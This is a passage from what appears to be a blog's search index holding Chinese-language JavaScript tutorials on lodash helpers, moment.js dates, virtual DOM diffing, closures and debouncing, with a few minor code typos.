&#123;//    aaa: &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;,//    bbb: &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;//&#125;\n\n_.filter\n根据条件过滤出符合条件的元素，返回新数组\n\nvar foo = var foo = [    &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;,    &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;]var bar = _.filter(foo, [&#x27;name&#x27;, &quot;aaa&quot;])//bar = &#123;//    aaa: &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;//&#125;\n\n_.map\n从集合中挑出一个key，将其值作为数组返回\n\nvar foo = var foo = [    &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;,    &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;]var bar = _.map(foo, &#x27;name&#x27;)//bar = [&quot;aaa&quot;, &quot;bbb&quot;]\n\n.max&#x2F;.min&#x2F;_.sum\n数组中最大值、最小值、数组求和\n\nvar foo = [1, 2, 3, 4]var bar = _.max(foo)//bar = 4bar = _.min(foo)//bar = 1bar = _.sum(foo)//bar = 10\n\n.pad&#x2F;.padStart&#x2F;_.padEnd\n在两端、开头、末尾补齐字符\n\nvar foo = &quot;helloworld&quot;var bar = _.pad(foo, 14, &#x27;-&#x27;)//bar = --helloworld--bar = _.padStart(foo, 14, &#x27;-&#x27;)//bar = ----helloworldbar = _.padEnd(foo, 14, &#x27;-&#x27;)//bar = helloworld----\n\n选出json数组中id最大的一项var foo = [    &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;,    &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;]var bar = _.find(foo, [&#x27;id&#x27;, _.max(_.map(foo, &#x27;id&#x27;))])// bar = &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;// ps:也可以用maxBy某个key来代替\n\n更新json数组中某一项的值var foo = [    &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;,    &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;]let list = _.keyBy(foo, &#x27;id&#x27;)list[0].name = &quot;ccc&quot;var bar = _.map(list)// bar = [//    &#123;id: 0, name: &quot;ccc&quot;, age: 33&#125;,//    &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;//]\n\n扁平化数组 _.flattenvar arr = [1,2,[3,4,[5],6]]var a8 = _.flatten(arr)  //[ 1, 2, 3, 4, [ 5 ], 6 ]var a9 = _.flattenDeep(arr)  //[ 1, 2, 3, 4, 5, 6 ]var a10 = _.flattenDepth(arr,2)  //[ 1, 2, 3, 4, 5, 6 ]\n\n数组去重var arr2 = [12,14,11,12,12,1,14,16,17,22,2,11,12]var a11 = Array.from(new Set(arr2))var a12 = [...new Set(arr2)]var a13 = _.uniq(arr2)  //[ 12, 14, 11, 1, 16, 17, 22, 2 ]var arrObj = [&#123; &#x27;x&#x27;: 1, &#x27;y&#x27;: 2 &#125;, &#123; &#x27;x&#x27;: 2, &#x27;y&#x27;: 1 &#125;,&#123; &#x27;x&#x27;: 2, &#x27;y&#x27;: 1 &#125;, &#123; &#x27;x&#x27;: 1, &#x27;y&#x27;: 2 &#125;];var a14 = _.uniqWith(arrObj, _.isEqual)  //[ &#123; x: 1, y: 2 &#125;, &#123; x: 2, y: 1 &#125; ]","categories":["前端"],"tags":["javascript"]},{"title":"js-moment.js","url":"/2018/01/16/html+css+js+ts/3-js%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85moment/","content":"一、基础用法取当天时间，以YYYY年MM月DD日形式显示\nvar now=moment().format(&quot;YYYY年MM月DD日&quot;);\n\n任意时间戳格式化，以YYYY-MM-DD HH:mm:ss形式显示\nvar t1=moment(1411641720000).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;);\n\n获取前一天日期，格式以YYYY-MM-DD形式显示\nvar t11=moment().day(0).format(&#x27;YYYY-MM-DD&#x27;);\n\n获取本周五日期，格式以YYYY-MM-DD形式显示\nvar t12=moment().weekday(5).format(&#x27;YYYY-MM-DD&#x27;);\n\n获取上周五日期，格式以YYYY-MM-DD形式显示\nvar t13=moment().weekday(-3).format(&#x27;YYYY-MM-DD&#x27;);\n\n获取当前年份、月份、日期\nvar t14=moment().year()var t15=moment().month()//此处月份从0开始，当前月要+1var t16=moment().date();\n\n获取上个月今天的日期，格式以YYYY-MM-DD显示\nvar t18=moment().subtract(1, &#x27;months&#x27;).format(&#x27;YYYY-MM-DD&#x27;);\n\n获取上个月日期，格式以YYYY-MM显示\nvar t19=moment().subtract(1, &#x27;months&#x27;).format(&#x27;YYYY-MM&#x27;)\n\n获取前一天日期，格式以YYYY-MM-DD显示\nvar t20 = moment().subtract(1, &#x27;days&#x27;).format(&#x27;YYYY-MM-DD&#x27;);\n\n获取两个小时之后的时间\nvar t22=moment().add(2,&#x27;hours&#x27;).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;);\n\n获取五天前的日期\n\n例如:今天2018-7-23，获取到的时间是2018-7-18\n\nvar t23=moment().subtract(5, &#x27;days&#x27;).format(&#x27;YYYY-MM-DD&#x27;);\n\n二、更多示例&#x27;use strict&#x27;let moment = require(&#x27;moment&#x27;);//获取当前时间var now = moment().toDate();console.log(now) //格式化当前时间now = moment().format(&#x27;YYYY-MM-DD&#x27;);console.log(now); //其它几种格式化方法now = moment().format(&#x27;L&#x27;) // 10/22/2016 console.log(now); now = moment().format(&#x27;LL&#x27;) // October 22, 2016console.log(now); //格式化当前时间now = moment().format(&#x27;YYYY-MM-DD:HH:MM:SS&#x27;);console.log(now); //获取这个月初时间let startMonth = moment().startOf(&#x27;month&#x27;).toDate();console.log(startMonth); //获取今天开始的时间let dayOfStart = moment().startOf(&#x27;day&#x27;).toDate();console.log(dayOfStart); //获取今天结束的时间let dayOfEnd = moment().endOf(&#x27;day&#x27;).toDate();console.log(dayOfEnd);  //获取＋n小时let lateHour = moment().add(2,&#x27;hour&#x27;).toDate();console.log(lateHour); //获取＋n小时console.log(&#x27;//获取-n小时&#x27;)let beforeHour = moment().subtract(2,&#x27;hour&#x27;).toDate();console.log(beforeHour);  //获取＋n天let lateDay = moment().add(+5,&#x27;day&#x27;).toDate();console.log(lateDay); //获取-n天let beforeDay = moment().add(-5,&#x27;day&#x27;).toDate();console.log(beforeDay);//也可以表示为beforeDay = moment().subtract(5,&#x27;day&#x27;).toDate();console.log(beforeDay); console.log(&#x27;//获取＋n月&#x27;)let lateMonth = moment().add(2,&#x27;month&#x27;).toDate();console.log(lateHour); //获取＋n月let beforeMonth = moment().subtract(2,&#x27;month&#x27;).toDate();console.log(lateHour);   //获取星期let week = moment().format(&#x27;dddd&#x27;);console.log(week); //获取到现在的年限 如果不满一年显示出具体几个月let years = moment(&#x27;2020-12-31&#x27;).fromNow();console.log(years);\n\n三、综合import moment from &#x27;moment&#x27;DATE_TODAY: moment().format(&#x27;YYYY-MM-DD&#x27;),//今天DATE_YESTERDAY: moment().subtract(1, &#x27;days&#x27;).format(&#x27;YYYY-MM-DD&#x27;), // 昨天DATE_1_WEEK_BEFORE: moment().subtract(1, &#x27;weeks&#x27;).format(&#x27;YYYY-MM-DD&#x27;),// 一周前DATE_2_WEEKS_BEFORE: moment().subtract(2, &#x27;weeks&#x27;).format(&#x27;YYYY-MM-DD&#x27;),// 两周前DATE_3_WEEKS_BEFORE: moment().subtract(3, &#x27;weeks&#x27;).format(&#x27;YYYY-MM-DD&#x27;),// DATE_1_MONTH_BEFORE: moment().subtract(1, &#x27;months&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_2_MONTH_BEFORE: moment().subtract(2, &#x27;months&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_3_MONTHS_BEFORE: moment().subtract(3, &#x27;months&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_1_YEAR_BEFORE: moment().subtract(1, &#x27;years&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_3_MONTHS_AFTER: moment().add(3, &#x27;months&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_1_YEAR_AFTER: moment().add(1, &#x27;year&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_FIRST_DAY_OF_MONTH: moment().startOf(&#x27;month&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_LAST_DAY_OF_MONTH: moment().endOf(&#x27;month&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_7_DAYS_BEFORE: moment().subtract(7, &#x27;days&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_30_DAYS_BEFORE: moment().subtract(30, &#x27;days&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_90_DAYS_BEFORE: moment().subtract(90, &#x27;days&#x27;).format(&#x27;YYYY-MM-DD&#x27;),DATE_100_DAYS_BEFORE: moment().subtract(100, &#x27;days&#x27;).format(&#x27;YYYY-MM-DD&#x27;),// 最近一个小时时间戳new Date(moment().add(1, &#x27;h&#x27;).format(&#x27;YYYY-MM-DD hh:mm:ss&#x27;)).getTime()// 格式化时间戳为日期 2018-12-06:12:21moment(时间戳 * 1000).format(&#x27;YY-MM-DD:HH:mm:ss&#x27;)// 计算时间当前时间和最近一小时时间差 差分钟const oneHourBefore = new Date(moment().add(1, &#x27;h&#x27;).format(&#x27;YYYY-MM-DD hh:mm:ss&#x27;)).getTime()const currTime = Date.now()const minute = moment(currTime).diff(oneHourBefore), &#x27;minute&#x27;)\n\n四、其他/**  * [getTimeList description] 生成时间列表  * @param  &#123;[type]&#125; hours [description] 小时  * @param  &#123;[type]&#125; step  [description] 分段  * @return &#123;[type]&#125;       [description] 时间段列表  */  function getTimeList(hours, step)&#123;      var minutes = 60      var timeArr = []      hours = hours      step = step         for(var i = 0; i &lt; hours; i++)&#123;          var str = &#x27;&#x27;          if(i &lt; 10) &#123;              str = 0 + &#x27;&#x27; + i          &#125; else &#123;              str = &#x27;&#x27; + i          &#125;            for(var j = 0; j &lt; minutes; j++) &#123;              if(j % step == 0)&#123;                  var s = j &lt; 10 ? &#x27;:&#x27; + 0 + &#x27;&#x27; + j : &#x27;:&#x27; +  j;                  s = str + s                  timeArr.push(s)              &#125;          &#125;      &#125;        return timeArr;    &#125;  getTimeList(12, 15)\n","categories":["前端"],"tags":["javascript"]},{"title":"js DOM基础","url":"/2018/02/17/html+css+js+ts/3-js%E8%99%9A%E6%8B%9FDOM%E5%9F%BA%E7%A1%80/","content":"一、什么是 vdom\n用 JS 模拟 DOM 结构\nDOM 变化的对比，放在 JS 层来做\n提高重绘性能\n\n二、设计一个需求场景\n用jQuery实现\n\n遇到的问题\n\nDOM 操作是“昂贵”的，js 运行效率高\n尽量减少 DOM 操作，而不是“推倒重来”\n项目越复杂，影响就越严重\nvdom 即可解决这个问题\n\n\n三、vdom 的如何应用，核心 API 是什么什么是 vdom\n\n介绍 snabbdom\n\n介绍 snabbdom - h 函数\n\n介绍 snabbdom - patch 函数\n\n重做jQuery的demo\n\n使用 data生成 vnode\n第一次渲染，将 vnode 渲染到 #container中\n并将 vnode 缓存下来\n修改 data 之后，用新 data 生成 newVnode\n将 vnode 和 newVnode 对比\n\n\n核心 API\n\nh(‘&lt;标签名&gt;’, &#123;…属性…&#125;, […子元素…])\nh(‘&lt;标签名&gt;’, &#123;…属性…&#125;, ‘….’)\npatch(container, vnode)\npatch(vnode, newVnode)\n\n四、介绍一下 diff 算法4.1 vdom 为何使用 diff 算法\nDOM 操作是“昂贵”的，因此尽量减少 DOM 操作\n找出本次 DOM 必须更新的节点来更新，其他的不更新\n这个“找出”的过程，就需要 diff 算法\n\n\npatch(container, vnode)\n\n演示过程\n\n4.2 diff 实现过程\npatch(container, vnode) 和 patch(vnode, newVnode)\ncreateElment\nupdateChildren\n\n","categories":["前端"],"tags":["javascript"]},{"title":"js DOM进阶","url":"/2018/02/19/html+css+js+ts/3-js%E8%99%9A%E6%8B%9FDOM%E8%BF%9B%E9%98%B6/","content":"一、为什么需要虚拟DOM\n先介绍浏览器加载一个HTML文件需要做哪些事，帮助我们理解为什么我们需要虚拟DOM。webkit引擎的处理流程\n\n\n所有浏览器的引擎工作流程都差不多，如上图大致分5步：创建DOM tree –&gt; 创建Style Rules -&gt; 构建Render tree -&gt; 布局Layout –&gt; 绘制Painting\n\n\n第一步，用HTML分析器，分析HTML元素，构建一颗DOM树。\n第二步：用CSS分析器，分析CSS文件和元素上的inline样式，生成页面的样式表。\n第三步：将上面的DOM树和样式表，关联起来，构建一颗Render树。这一过程又称为Attachment。每个DOM节点都有attach方法，接受样式信息，返回一个render对象（又名renderer）。这些render对象最终会被构建成一颗Render树。\n第四步：有了Render树后，浏览器开始布局，会为每个Render树上的节点确定一个在显示屏上出现的精确坐标值。\n第五步：Render数有了，节点显示的位置坐标也有了，最后就是调用每个节点的paint方法，让它们显示出来。\n\n\n当你用传统的源生api或jQuery去操作DOM时，浏览器会从构建DOM树开始从头到尾执行一遍流程。比如当你在一次操作时，需要更新10个DOM节点，理想状态是一次性构建完DOM树，再执行后续操作。但浏览器没这么智能，收到第一个更新DOM请求后，并不知道后续还有9次更新操作，因此会马上执行流程，最终执行10次流程。显然例如计算DOM节点的坐标值等都是白白浪费性能，可能这次计算完，紧接着的下一个DOM更新请求，这个节点的坐标值就变了，前面的一次计算是无用功。\n\n\n即使计算机硬件一直在更新迭代，操作DOM的代价仍旧是昂贵的，频繁操作还是会出现页面卡顿，影响用户的体验。真实的DOM节点，哪怕一个最简单的div也包含着很多属性，可以打印出来直观感受一下\n\n\n\n虚拟DOM就是为了解决这个浏览器性能问题而被设计出来的。例如前面的例子，假如一次操作中有10次更新DOM的动作，虚拟DOM不会立即操作DOM，而是将这10次更新的diff内容保存到本地的一个js对象中，最终将这个js对象一次性attach到DOM树上，通知浏览器去执行绘制工作，这样可以避免大量的无谓的计算量\n\n二、实现虚拟DOM&lt;div id=&quot;real-container&quot;&gt;    &lt;p&gt;Real DOM&lt;/p&gt;    &lt;div&gt;cannot update&lt;/div&gt;    &lt;ul&gt;        &lt;li className=&quot;item&quot;&gt;Item 1&lt;/li&gt;        &lt;li className=&quot;item&quot;&gt;Item 2&lt;/li&gt;        &lt;li className=&quot;item&quot;&gt;Item 3&lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;\n\n\n用js对象来模拟DOM节点如下\n\nconst tree = Element(&#x27;div&#x27;, &#123; id: &#x27;virtual-container&#x27; &#125;, [    Element(&#x27;p&#x27;, &#123;&#125;, [&#x27;Virtual DOM&#x27;]),    Element(&#x27;div&#x27;, &#123;&#125;, [&#x27;before update&#x27;]),    Element(&#x27;ul&#x27;, &#123;&#125;, [        Element(&#x27;li&#x27;, &#123; class: &#x27;item&#x27; &#125;, [&#x27;Item 1&#x27;]),        Element(&#x27;li&#x27;, &#123; class: &#x27;item&#x27; &#125;, [&#x27;Item 2&#x27;]),        Element(&#x27;li&#x27;, &#123; class: &#x27;item&#x27; &#125;, [&#x27;Item 3&#x27;]),    ]),]);const root = tree.render();document.getElementById(&#x27;virtualDom&#x27;).appendChild(root);\n\n\n用js对象模拟DOM节点的好处是，页面的更新可以先全部反映在js对象上，操作内存中的js对象的速度显然要快多了。等更新完后，再将最终的js对象映射成真实的DOM，交由浏览器去绘制\n\nfunction Element(tagName, props, children) &#123;    if (!(this instanceof Element)) &#123;        return new Element(tagName, props, children);    &#125;    this.tagName = tagName;    this.props = props || &#123;&#125;;    this.children = children || [];    this.key = props ? props.key : undefined;    let count = 0;    this.children.forEach((child) =&gt; &#123;        if (child instanceof Element) &#123;            count += child.count;        &#125;        count++;    &#125;);    this.count = count;&#125;\n\n\n第一个参数是节点名（如div），第二个参数是节点的属性（如class），第三个参数是子节点（如ul的li）。除了这三个参数会被保存在对象上外，还保存了key和count\n\n\n\n有了js对象后，最终还需要将其映射成真实的DOM\n\nElement.prototype.render = function() &#123;    const el = document.createElement(this.tagName);    const props = this.props;    for (const propName in props) &#123;        setAttr(el, propName, props[propName]);    &#125;    this.children.forEach((child) =&gt; &#123;        const childEl = (child instanceof Element) ? child.render() : document.createTextNode(child);        el.appendChild(childEl);    &#125;);    return el;&#125;;\n\n\n根据DOM名调用源生的createElement创建真实DOM，将DOM的属性全都加到这个DOM元素上，如果有子元素继续递归调用创建子元素，并appendChild挂到该DOM元素上。这样就完成了从创建虚拟DOM到将其映射成真实DOM的全部工作\n\n三、Diff算法\n我们已经完成了创建虚拟DOM并将其映射成真实DOM的工作，这样所有的更新都可以先反映到虚拟DOM上，如何反映呢？需要明确一下Diff算法\n\n\n两棵树如果完全比较时间复杂度是O(n^3)\nReact的Diff算法的时间复杂度是O(n)。要实现这么低的时间复杂度，意味着只能平层地比较两棵树的节点，放弃了深度遍历\n这样做，似乎牺牲了一定的精确性来换取速度，但考虑到现实中前端页面通常也不会跨层级移动DOM元素，所以这样做是最优的。\n\n我们新创建一棵树，用于和之前的树进行比较\nconst newTree = Element(&#x27;div&#x27;, &#123; id: &#x27;virtual-container&#x27; &#125;, [    Element(&#x27;h3&#x27;, &#123;&#125;, [&#x27;Virtual DOM&#x27;]),                     // REPLACE    Element(&#x27;div&#x27;, &#123;&#125;, [&#x27;after update&#x27;]),                   // TEXT    Element(&#x27;ul&#x27;, &#123; class: &#x27;marginLeft10&#x27; &#125;, [              // PROPS        Element(&#x27;li&#x27;, &#123; class: &#x27;item&#x27; &#125;, [&#x27;Item 1&#x27;]),        // Element(&#x27;li&#x27;, &#123; class: &#x27;item&#x27; &#125;, [&#x27;Item 2&#x27;]),    // REORDER remove        Element(&#x27;li&#x27;, &#123; class: &#x27;item&#x27; &#125;, [&#x27;Item 3&#x27;]),    ]),]);\n\n只考虑平层地Diff的话，就简单多了，只需要考虑以下4种情况\n\n第一种是最简单的，节点类型变了，例如下图中的P变成了h3。我们将这个过程称之为REPLACE。直接将旧节点卸载（componentWillUnmount）并装载新节点（componentWillMount）就行了\n\n\n旧节点包括下面的子节点都将被卸载，如果新节点和旧节点仅仅是类型不同，但下面的所有子节点都一样时，这样做显得效率不高。但为了避免O(n^3)的时间复杂度，这样做是值得的。这也提醒了React开发者，应该避免无谓的节点类型的变化，例如运行时将div变成p就没什么太大意义\n\n第二种也比较简单，节点类型一样，仅仅属性或属性值变了\n\nrenderA: &lt;ul&gt;renderB: &lt;ul class: &#x27;marginLeft10&#x27;&gt;=&gt; [addAttribute class &quot;marginLeft10&quot;]\n\n\n我们将这个过程称之为PROPS。此时不会触发节点的卸载（componentWillUnmount）和装载（componentWillMount）动作。而是执行节点更新（shouldComponentUpdate到componentDidUpdate的一系列方法）\n\nfunction diffProps(oldNode, newNode) &#123;    const oldProps = oldNode.props;    const newProps = newNode.props;    let key;    const propsPatches = &#123;&#125;;    let isSame = true;    // find out different props    for (key in oldProps) &#123;        if (newProps[key] !== oldProps[key]) &#123;            isSame = false;            propsPatches[key] = newProps[key];        &#125;    &#125;    // find out new props    for (key in newProps) &#123;        if (!oldProps.hasOwnProperty(key)) &#123;            isSame = false;            propsPatches[key] = newProps[key];        &#125;    &#125;    return isSame ? null : propsPatches;&#125;\n\n\n第三种是文本变了，文本对也是一个Text Node，也比较简单，直接修改文字内容就行了，我们将这个过程称之为TEXT\n第四种是移动，增加，删除子节点，我们将这个过程称之为REORDER\n\n\n\n在中间插入一个节点，程序员写代码很简单：$(B).after(F)。但如何高效地插入呢？简单粗暴的做法是：卸载C，装载F，卸载D，装载C，卸载E，装载D，装载E。如下图\n\n\n\n我们写JSX代码时，如果没有给数组或枚举类型定义一个key，就会看到下面这样的warning。React提醒我们，没有key的话，涉及到移动，增加，删除子节点的操作时，就会用上面那种简单粗暴的做法来更新。虽然程序运行不会有错，但效率太低，因此React会给我们一个warning\n\n\n\n如果我们在JSX里为数组或枚举型元素增加上key后，React就能根据key，直接找到具体的位置进行操作，效率比较高。如下图\n\n\n\n常见的最小编辑距离问题，可以用Levenshtein Distance算法来实现，时间复杂度是O(M*N)，但通常我们只要一些简单的移动就能满足需要，降低点精确性，将时间复杂度降低到O(max(M, N)即可\n\n最终Diff出来的结果如下\n&#123;    1: [ &#123;type: REPLACE, node: Element&#125; ],    4: [ &#123;type: TEXT, content: &quot;after update&quot;&#125; ],    5: [ &#123;type: PROPS, props: &#123;class: &quot;marginLeft10&quot;&#125;&#125;, &#123;type: REORDER, moves: [&#123;index: 2, type: 0&#125;]&#125; ],    6: [ &#123;type: REORDER, moves: [&#123;index: 2, type: 0&#125;]&#125; ],    8: [ &#123;type: REORDER, moves: [&#123;index: 2, type: 0&#125;]&#125; ],    9: [ &#123;type: TEXT, content: &quot;Item 3&quot;&#125; ],&#125;\n\n四、映射成真实DOM\n虚拟DOM有了，Diff也有了，现在就可以将Diff应用到真实DOM上了\n\n深度遍历DOM将Diff的内容更新进去\nfunction dfsWalk(node, walker, patches) &#123;    const currentPatches = patches[walker.index];    const len = node.childNodes ? node.childNodes.length : 0;    for (let i = 0; i &lt; len; i++) &#123;        walker.index++;        dfsWalk(node.childNodes[i], walker, patches);    &#125;    if (currentPatches) &#123;        applyPatches(node, currentPatches);    &#125;&#125;\n\n\n具体更新的代码如下，其实就是根据Diff信息调用源生API操作DOM\n\nfunction applyPatches(node, currentPatches) &#123;    currentPatches.forEach((currentPatch) =&gt; &#123;        switch (currentPatch.type) &#123;            case REPLACE: &#123;                const newNode = (typeof currentPatch.node === &#x27;string&#x27;)                    ? document.createTextNode(currentPatch.node)                    : currentPatch.node.render();                node.parentNode.replaceChild(newNode, node);                break;            &#125;            case REORDER:                reorderChildren(node, currentPatch.moves);                break;            case PROPS:                setProps(node, currentPatch.props);                break;            case TEXT:                if (node.textContent) &#123;                    node.textContent = currentPatch.content;                &#125; else &#123;                    // ie                    node.nodeValue = currentPatch.content;                &#125;                break;            default:                throw new Error(`Unknown patch type $&#123;currentPatch.type&#125;`);        &#125;    &#125;);&#125;\n\n\n虚拟DOM的目的是将所有操作累加起来，统计计算出所有的变化后，统一更新一次DOM\n\n","categories":["前端"],"tags":["javascript"]},{"title":"闭包","url":"/2018/01/03/html+css+js+ts/3-js%E9%97%AD%E5%8C%85/","content":"\n闭包的形成跟变量的作用域以及变量的生存周期密切相关\n\n一、变量的作用域,是指变量的有效范围\n当在函数中声明一个变量的时候,如果该变量前面没有带上关键字 var,这个变量就会成为全局变量 ,这当然是一种很容易造成命名冲突的做法。另外一种情况是用 var 关键字在函数中声明变量,这时候的变量即是局部变量,只有在该函数内部才能访问到这个变量,在函数外面是访问不到的。\n\n例：变量的搜索是从内到外而非从外到 内的\nvar a=1;var func1 = function()&#123;     var b=2;    var func2 = function()&#123;         var c=3;        console.log ( b ); // 输出:2         console.log ( a );// 输出:1    &#125;    func2();    console.log(c);//输出:Uncaught ReferenceError: c is not defined&#125;; func1();\n\n二、变量的生存周期\n对于全局变量来说,全局变量的生存周期当然是的永久,除非我们主动销毁这个全局变量。\n而对于在函数内用var关键字声明的局部变量来说,当退出函数时,这些局部变量即失去了 它们的价值,它们都会随着函数的调用的结束而销毁\n\n例一：\nvar func = function()&#123;     var a=1;    return function()&#123;         a++;        console.log(a);    &#125; &#125;;var f=func();f();// 输出:2 f();// 输出:3f();// 输出:4f();// 输出:5\n\n\n跟我们之前的结论相反,上面的例子在当退出函数后,局部变量a 并没有消失,而是似乎一直在某个地方 存活着。这是因为当执行 var f = func();时,f 返回了一个名函数的引用,它可以问到func() 被调用时产生的环境,而局部变量 a 一直处在这个环境里。既然外局部变量所在的环境还能被外 界访问,这个局部变量就有了不被销毁的理由。在这里生了一个闭包结构,局部变量的声明看起来被延续了。\n\n例二，假设页面上有 5 个 div 节点,我们通过循环来给每个 div绑定 onclick 事件,按照索引顺序,点击第 1 个 div 时弹出 0,点击第 2 个 div 时出 1,以此类\nvar nodes = document.getElementsByTagName( &#x27;div&#x27; );for(var i=0,len=nodes.length;i&amp;lt;len;i++)&#123;     nodes[ i ].onclick = function()&#123;        alert(i);     &#125;&#125;;\n\n\n测试这段代码会发现,无论点击哪个 div,最后弹出的结果都是 5\n这是因为 div 节点的 onclick 事件是被异步触发的,当事件被触发的时候,for循环早已结束,此时 i 的值已经是 5,\n所以在 div的 onclick 事件函数中顺着作用域链从内到外查找变量 i 时,查找到的值总是 5。\n解决方法是在闭包的帮助下,每次循环的i 值都封闭起来。当在事件函数中顺着作用域链从内到外查找变量 i时,会先找到被封闭在闭包环境中的i,如果有5个div,这里的i分别 是 0,1,2,3,4\n\nfor(var i=0,len=nodes.length;i&amp;lt;len;i++)&#123;     (function( i )&#123;        nodes[ i ].onclick = function()&#123;             console.log(i);        &#125;     &#125;)(i)&#125;;\n\n三、闭包的作用1、封装变量—-闭包可以帮助一些不需要暴露在全局的变量封装成“私有变量”\n例一，计算乘积\n\nvar mult = function()&#123;     var a=1;    for(var i=0,l=arguments.length;i&amp;lt;l;i++)&#123;         a = a * arguments[i];    &#125;    return a; &#125;;\n\n2、延续局部变量的寿命四、闭包与内存泄漏function a() &#123;    var i = 0;    function b() &#123;        console.log(++i);    &#125;    return b;&#125;var c = a();c();\n\n\n首先有一个封闭的函数a（即自定义的一个function a()方法），该函数内部的变量b（局部变量&#x2F;局部方法）外部无法直接调用；但如果把这个函数赋值给一个全部变量c时，\n全局变量c就获取到了函数局部变量b的值，从而使局部变量b的值得到了保存，即延长了一个局部变量b的生命周期，除非主动销毁这个全局变量c。此时，我们也就制造出来了一个“闭包”。简单说“闭包是指有权限访问另一个函数作用域的变量的函数”。\n在这个过程中，因为局部变量b的声明周期延长，使得Javascript的垃圾回收机制不会收回函数a所占用的资源,因为函数a的局部变量b的执行需要依赖函数a中的变量。\n\n","categories":["前端"],"tags":["javascript"]},{"title":"js-防抖节流原理","url":"/2018/01/17/html+css+js+ts/3-js%E9%98%B2%E6%8A%96%E8%8A%82%E6%B5%81%E5%8E%9F%E7%90%86/","content":"一、防抖debounce\n你是否在日常开发中遇到一个问题，在滚动事件中需要做个复杂计算或者实现一个按钮的防二次点击操作\n\n\n这些需求都可以通过函数防抖动来实现。如果在频繁的事件回调中做复杂计算，很有可能导致页面卡顿，不如将多次计算合并为一次计算，只在一个精确点做操作\n防抖和节流的作用都是防止函数多次调用。区别在于，假设一个用户一直触发这个函数，且每次触发函数的间隔小于wait，防抖的情况下只会调用一次，而节流的 情况会每隔一定时间（参数wait）调用函数\n\n\n持续触发scroll事件时，并不执行handle函数，当1000毫秒内没有触发scroll事件时，才会延时触发scroll事件\n\n\n// 防抖function debounce(fn, wait) &#123;        var timeout = null;        return function() &#123;                if(timeout !== null)   clearTimeout(timeout);                timeout = setTimeout(fn, wait);        &#125;&#125;// 处理函数function handle() &#123;        console.log(Math.random()); &#125;// 滚动事件// 当持续触发scroll事件时，事件处理函数handle只在停止滚动1000毫秒之后才会调用一次，也就是说在持续触发scroll事件的过程中，事件处理函数handle一直没有执行window.addEventListener(&#x27;scroll&#x27;, debounce(handle, 1000));\n\n\n我们先来看一个袖珍版的防抖理解一下防抖的实现\n\n// func是用户传入需要防抖的函数// wait是等待时间const debounce = (func, wait = 50) =&gt; &#123;  // 缓存一个定时器id  let timer = 0  // 这里返回的函数是每次用户实际调用的防抖函数  // 如果已经设定过定时器了就清空上一次的定时器  // 开始一个新的定时器，延迟执行用户传入的方法  return function(...args) &#123;    if (timer) clearTimeout(timer)    timer = setTimeout(() =&gt; &#123;      func.apply(this, args)    &#125;, wait)  &#125;&#125;// 不难看出如果用户调用该函数的间隔小于wait的情况下，上一次的时间还未到就被清除了，并不会执行函数\n\n\n这是一个简单版的防抖，但是有缺陷，这个防抖只能在最后调用。一般的防抖会有immediate选项，表示是否立即调用。这两者的区别，举个栗子来说\n\n\n例如在搜索引擎搜索问题的时候，我们当然是希望用户输入完最后一个字才调用查询接口，这个时候适用延迟执行的防抖函数，它总是在一连串（间隔小于wait的）函数触发之后调用。\n例如用户给interviewMap点star的时候，我们希望用户点第一下的时候就去调用接口，并且成功之后改变star按钮的样子，用户就可以立马得到反馈是否star成功了，这个情况适用立即执行的防抖函数，它总是在第一次调用，并且下一次调用必须与前一次调用的时间间隔大于wait才会触发\n\n完整代码\n\n下面我们来实现一个带有立即执行选项的防抖函数\n\n// 这个是用来获取当前时间戳的function now() &#123;  return +new Date()&#125;/** * 防抖函数，返回函数连续调用时，空闲时间必须大于或等于 wait，func 才会执行 * * @param  &#123;function&#125; func        回调函数 * @param  &#123;number&#125;   wait        表示时间窗口的间隔 * @param  &#123;boolean&#125;  immediate   设置为ture时，是否立即调用函数 * @return &#123;function&#125;             返回客户调用函数 */function debounce (func, wait = 50, immediate = true) &#123;  let timer, context, args  // 延迟执行函数  const later = () =&gt; setTimeout(() =&gt; &#123;    // 延迟函数执行完毕，清空缓存的定时器序号    timer = null    // 延迟执行的情况下，函数会在延迟函数中执行    // 使用到之前缓存的参数和上下文    if (!immediate) &#123;      func.apply(context, args)      context = args = null    &#125;  &#125;, wait)  // 这里返回的函数是每次实际调用的函数  return function(...params) &#123;    // 如果没有创建延迟执行函数（later），就创建一个    if (!timer) &#123;      timer = later()      // 如果是立即执行，调用函数      // 否则缓存参数和调用上下文      if (immediate) &#123;        func.apply(this, params)      &#125; else &#123;        context = this        args = params      &#125;    // 如果已有延迟执行函数（later），调用的时候清除原来的并重新设定一个    // 这样做延迟函数会重新计时    &#125; else &#123;      clearTimeout(timer)      timer = later()    &#125;  &#125;&#125;\n\n\n对于按钮防点击来说的实现：如果函数是立即执行的，就立即调用，如果函数是延迟执行的，就缓存上下文和参数，放到延迟函数中去执行。一旦我开始一个定时器，只要我定时器还在，你每次点击我都重新计时。一旦你点累了，定时器时间到，定时器重置为 